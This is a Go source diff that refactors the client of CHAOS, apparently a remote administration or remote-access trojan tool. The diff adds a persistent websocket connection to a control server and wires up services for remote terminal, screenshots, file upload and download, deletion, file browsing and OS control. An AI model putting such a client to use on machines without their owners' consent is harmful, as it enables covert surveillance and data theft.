@@ -3,6 +3,7 @@ package app
 import (
 	"github.com/tiagorlampert/CHAOS/client/app/gateway/client"
 	"github.com/tiagorlampert/CHAOS/client/app/handler"
+	"github.com/tiagorlampert/CHAOS/client/app/infrastructure/websocket"
 	"github.com/tiagorlampert/CHAOS/client/app/services"
 	"github.com/tiagorlampert/CHAOS/client/app/services/delete"
 	"github.com/tiagorlampert/CHAOS/client/app/services/download"
@@ -14,42 +15,48 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/services/upload"
 	"github.com/tiagorlampert/CHAOS/client/app/services/url"
 	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
-	"github.com/tiagorlampert/CHAOS/client/app/utilities/system"
-	"net/http"
+	"github.com/tiagorlampert/CHAOS/client/app/utilities/network"
+	"log"
 )
 
 type App struct {
 	Handler *handler.Handler
 }
 
-func NewApp(httpClient *http.Client, configuration *environment.Configuration) *App {
-	osType := system.DetectOS()
-	clientGateway := client.NewGateway(configuration, httpClient)
+func New(configuration *environment.Configuration) *App {
+	informationService := information.NewService(configuration.Server.HttpPort)
 
-	informationService := information.NewInformationService(configuration.Server.Port)
-	terminalService := terminal.NewTerminalService()
-	appServices := &services.Services{
-		Information: informationService,
-		Terminal:    terminalService,
-		Screenshot:  screenshot.NewScreenshotService(),
-		Download:    download.NewDownloadService(configuration, clientGateway),
-		Upload:      upload.NewUploadService(configuration, httpClient),
-		Delete:      delete.NewDeleteService(),
-		Explorer:    explorer.NewExplorerService(),
-		OS:          os.NewOperatingSystemService(configuration, terminalService, osType),
-		URL:         url.NewURLService(terminalService, osType),
+	device, err := informationService.LoadDeviceSpecs()
+	if err != nil {
+		log.Fatal("error loading device specs: ", err)
 	}
 
-	deviceSpecs, err := informationService.LoadDeviceSpecs()
-	if err != nil {
-		panic(err)
+	connection, _ := websocket.NewConnection(configuration, device.MacAddress)
+
+	httpClient := network.NewHttpClient(10)
+
+	operatingSystem := os.DetectOS()
+	terminalService := terminal.NewTerminalService()
+
+	clientGateway := client.NewGateway(configuration, httpClient)
+
+	clientServices := &services.Services{
+		Information: informationService,
+		Terminal:    terminalService,
+		Screenshot:  screenshot.NewService(),
+		Download:    download.NewService(configuration, clientGateway),
+		Upload:      upload.NewService(configuration, httpClient),
+		Delete:      delete.NewService(),
+		Explorer:    explorer.NewService(),
+		OS:          os.NewService(configuration, terminalService, operatingSystem),
+		URL:         url.NewURLService(terminalService, operatingSystem),
 	}
 
 	return &App{handler.NewHandler(
-		configuration, clientGateway, appServices, deviceSpecs.MacAddress)}
+		connection, configuration, clientGateway, clientServices, device.MacAddress)}
 }
 
 func (a *App) Run() {
-	go a.Handler.HandleServer()
+	go a.Handler.KeepConnection()
 	a.Handler.HandleCommand()
 }
